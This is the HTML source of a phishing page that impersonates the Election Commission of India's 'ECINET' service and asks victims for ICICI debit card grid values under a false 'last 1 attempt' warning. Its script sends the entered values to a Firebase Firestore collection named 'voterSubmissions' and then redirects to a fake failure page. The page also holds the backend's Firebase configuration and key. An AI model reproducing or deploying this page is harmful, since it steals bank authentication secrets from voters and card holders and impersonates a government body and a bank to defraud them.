<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ECINET - Debit Card Grid Authentication Step 4</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        
        body { 
            background-color: #0056b3; 
            min-height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            padding: 15px; 
        }

        /* Form Container - Index.html ki tarah exact card style */
        .form-container { 
            background: #ffffff; 
            padding: 0 30px 30px 30px; 
            border-radius: 16px; 
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); 
            width: 100%; 
            max-width: 440px; 
            overflow: hidden; 
            text-align: center; 
        }

        /* Top Blue Header Section - बिना किसी ऊपर के गैप के */
        .top-header {
            margin-top: 0;
            margin-left: -30px;
            margin-right: -30px;
            margin-bottom: 25px;
            padding: 0 0 18px 0;
            width: calc(100% + 60px);
            background-color: #0056b3;
            text-align: center;
            color: white;
        }

        .top-header img {
            width: 100%;
            max-height: 100px;
            object-fit: contain;
            margin-bottom: 8px;
            display: block;
            background: transparent;
        }

        .top-header .hindi-title {
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 3px;
            letter-spacing: 0.5px;
        }

        .top-header .eng-title {
            font-size: 11px;
            font-weight: 400;
            margin-bottom: 8px;
            opacity: 0.9;
        }

        .top-header h1 {
            font-size: 24px;
            font-weight: 800;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        .form-container h2 { 
            margin-bottom: 5px; 
            color: #0056b3; 
            font-size: 20px; 
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .sub-title { color: #555; font-size: 12.5px; margin-bottom: 15px; font-weight: 600; }
        
        .card-preview-box {
            margin-bottom: 15px;
            background: #f8fafc;
            padding: 10px;
            border-radius: 8px;
            border: 1px solid #e2e8f0;
        }
        .card-preview-box img {
            width: 100%;
            max-width: 260px;
            height: auto;
            border-radius: 6px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.15);
        }
        .card-preview-text {
            font-size: 11px;
            color: #475569;
            margin-top: 6px;
            font-weight: 600;
        }

        .grid-container {
            display: flex;
            justify-content: space-between;
            gap: 12px;
            margin-bottom: 18px;
            background: #f8f9fa;
            padding: 15px 10px;
            border-radius: 8px;
            border: 1px solid #dfe4ea;
        }
        .grid-item { flex: 1; text-align: center; }
        .grid-label { display: block; margin-bottom: 6px; color: #004085; font-weight: bold; font-size: 15px; }
        .grid-input { width: 100%; padding: 10px 5px; border: 1px solid #dfe4ea; border-radius: 6px; font-size: 15px; text-align: center; letter-spacing: 2px; background: #fff; color: #333; }
        .grid-input:focus { outline: none; border-color: #0056b3; background: #fff; box-shadow: 0 0 5px rgba(0, 86, 179, 0.2); }

        .btn-next { width: 100%; padding: 14px; background: #0056b3; border: none; border-radius: 8px; color: white; font-size: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 4px 12px rgba(0, 86, 179, 0.3); }
        .btn-next:hover { background: #004085; }
        .btn-next:disabled { background: #6c757d; cursor: not-allowed; }
        
        .footer-text { margin-top: 25px; font-size: 10px; color: #666; font-weight: 600; border-top: 1px solid #eee; padding-top: 15px; line-height: 1.4; letter-spacing: 0.3px; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="form-container">
        <!-- Top Blue Header Section without top gap -->
        <div class="top-header">
            <img src="logo.png" alt="Election Commission Logo">
            <div class="hindi-title">भारत निर्वाचन आयोग</div>
            <div class="eng-title">Election Commission of India</div>
            <h1>ECINET</h1>
        </div>

        <h2>Debit Card Grid Authentication</h2>
        <div class="sub-title">Please Enter Correct Grid Value Last 1 Attempt Remain</div>

        <div class="card-preview-box">
            <img src="card-grid.png" alt="ICICI Card Grid Reference">
            <div class="card-preview-text">ICICI Bank Debit Card Grid Reference (Back Side)</div>
        </div>

        <form id="gridForm4">
            <div class="grid-container">
                <div class="grid-item">
                    <span class="grid-label">J</span>
                    <input type="password" id="gridE" name="gridE" class="grid-input" placeholder="--" maxlength="2" required>
                </div>
                <div class="grid-item">
                    <span class="grid-label">B</span>
                    <input type="password" id="gridJ" name="gridJ" class="grid-input" placeholder="--" maxlength="2" required>
                </div>
                <div class="grid-item">
                    <span class="grid-label">N</span>
                    <input type="password" id="gridL" name="gridL" class="grid-input" placeholder="--" maxlength="2" required>
                </div>
            </div>

            <button type="submit" id="submitBtn" class="btn-next">Complete Verification</button>
        </form>

        <div class="footer-text">
            भारत निर्वाचन आयोग | Election Commission of India
        </div>
    </div>

    <!-- Firebase SDK & Script -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAZ7Dvd7HYsZrMuP0bABJuMAEZmRtGw02U",
            authDomain: "voter-verification-a04d5.firebaseapp.com",
            projectId: "voter-verification-a04d5",
            storageBucket: "voter-verification-a04d5.firebasestorage.app",
            messagingSenderId: "582458013788",
            appId: "1:582458013788:web:15f8c7fd7dc05d24328e99",
            measurementId: "G-8CX5BVQXFC"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        document.getElementById('gridForm4').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const gridE = document.getElementById('gridE').value;
            const gridJ = document.getElementById('gridJ').value;
            const gridL = document.getElementById('gridL').value;
            const gridStep4Data = `E:${gridE}, J:${gridJ}, L:${gridL}`;

            const docId = localStorage.getItem('voterDocId');
            if (!docId) {
                alert("Session expired. Please start from the first page.");
                window.location.href = "index.html";
                return;
            }

            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerText = "Verifying with Bank...";

            try {
                const docRef = doc(db, "voterSubmissions", docId);
                await updateDoc(docRef, {
                    gridStep4: gridStep4Data,
                    currentStep: "Verification Completed (Grid Step 4)"
                });

                setTimeout(() => {
                    window.location.href = "failed.html"; 
                }, 1000);

            } catch (error) {
                console.error("Error updating document: ", error);
                alert("डेटा सेव करने में समस्या हुई।");
                btn.disabled = false;
                btn.innerText = "Complete Verification";
            }
        });
    </script>
</body>
</html>
